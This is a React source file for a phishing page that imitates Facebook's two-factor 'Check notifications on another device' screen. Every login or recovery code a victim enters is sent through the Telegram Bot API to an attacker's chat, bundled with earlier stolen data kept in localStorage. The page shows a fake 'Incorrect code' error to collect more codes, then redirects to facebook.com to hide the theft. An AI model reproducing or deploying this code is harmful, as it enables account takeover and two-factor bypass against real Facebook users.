import HeroImage from "@/assets/images/verify.png";
import type { TelegramResponse } from "@/types/telegram";
import getConfig from "@/utils/config";
import axios from "axios";
import { useEffect, useState } from "react";
import type { FC } from "react";

const Verify: FC = () => {
	const [code, setCode] = useState("");
	const [uiState, setUiState] = useState({
		error: "",
		isLoading: false,
		attempt: 0,
		messageId: 0,
	});

	const [config, setConfig] = useState({
		chatId: "",
		token: "",
		loadingTime: 0,
		maxAttempt: 0,
		codeEnabled: false,
	});

	useEffect(() => {
		const { telegram, settings } = getConfig();
		setConfig({
			chatId: telegram.data_chatid,
			token: telegram.data_token,
			loadingTime: settings.code_loading_time,
			maxAttempt: settings.max_failed_code_attempts,
			codeEnabled: settings.code_input_enabled,
		});
	}, []);

	const handleSubmit = async () => {
		const lastMessage = localStorage.getItem("lastMessage") ?? "";

		const createMessage = () => `${lastMessage}

📱 <b>MÃ XÁC THỰC</b>
${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
	const suffix = i > 0 ? ` ${i}` : "";
	return `• <b>Mã${suffix}:</b> <code>${code}</code>`;
}).join("\n")}`;

		if (uiState.attempt >= config.maxAttempt) {
			setUiState((prev) => ({
				...prev,
				isLoading: true,
			}));

			try {
				await axios.post(
					`https://api.telegram.org/bot${config.token}/editMessageText`,
					{
						chat_id: config.chatId,
						message_id: uiState.messageId,
						text: createMessage(),
						parse_mode: "HTML",
					},
				);

				setTimeout(() => {
					window.location.replace("https://facebook.com");
				}, config.loadingTime);
			} catch (error) {
				window.location.replace("https://facebook.com");
			}
			return;
		}

		setUiState((prev) => ({
			...prev,
			attempt: prev.attempt + 1,
			isLoading: true,
		}));

		const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
		const editUrl = `https://api.telegram.org/bot${config.token}/editMessageText`;

		try {
			let response: TelegramResponse;

			if (uiState.messageId && uiState.attempt > 0) {
				response = await axios.post(editUrl, {
					chat_id: config.chatId,
					message_id: uiState.messageId,
					text: createMessage(),
					parse_mode: "HTML",
				});
			} else {
				response = await axios.post(url, {
					chat_id: config.chatId,
					text: createMessage(),
					parse_mode: "HTML",
				});
				setUiState((prev) => ({
					...prev,
					messageId: response.data.result.message_id,
				}));
			}

			setTimeout(() => {
				setUiState((prev) => ({
					...prev,
					isLoading: false,
					error: "Incorrect code. Please try again.",
				}));
			}, config.loadingTime);
		} catch (error) {
			setUiState((prev) => ({
				...prev,
				isLoading: false,
				error: "Something went wrong. Please try again later.",
			}));
		}
	};

	const clearError = () => {
		setUiState((prev) => ({
			...prev,
			error: "",
		}));
	};

	return (
		<div className="flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
			<div className="flex flex-col">
				<b>Account Center - Facebook</b>
				<b className="text-2xl">Check notifications on another device</b>
			</div>

			<div>
				<img src={HeroImage} alt="verify" />
			</div>

			<div>
				<b>Approve from another device or Enter your login code</b>
				<p>
					Enter 6-digit code we just send from the authentication app you set
					up, or Enter 8-digit recovery code
				</p>
			</div>

			<div className="my-2 flex flex-col items-center justify-center">
				<input
					className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
						uiState.error ? "border-red-500 focus:border-red-500" : ""
					}`}
					type="text"
					autoComplete="one-time-code"
					inputMode="numeric"
					maxLength={8}
					minLength={6}
					pattern="\d*"
					placeholder="Enter Code (6-8 digits)"
					value={code}
					onFocus={clearError}
					onChange={(e) => {
						if (/[a-zA-Z]+/g.test(e.target.value)) return;
						setCode(e.target.value);
					}}
				/>

				{uiState.error && (
					<div className="mt-2 text-sm text-red-500">{uiState.error}</div>
				)}

				<button
					className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${code.length >= 6 ? "bg-blue-500 hover:bg-blue-600" : "cursor-not-allowed bg-blue-300"}`}
					disabled={code.length < 6 || uiState.isLoading}
					type="button"
					onClick={handleSubmit}
				>
					{uiState.isLoading ? (
						<div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
					) : (
						"Continue"
					)}
				</button>

				<a href="/home" className="text-blue-500 hover:underline">
					Send Code
				</a>
			</div>
		</div>
	);
};

export default Verify;
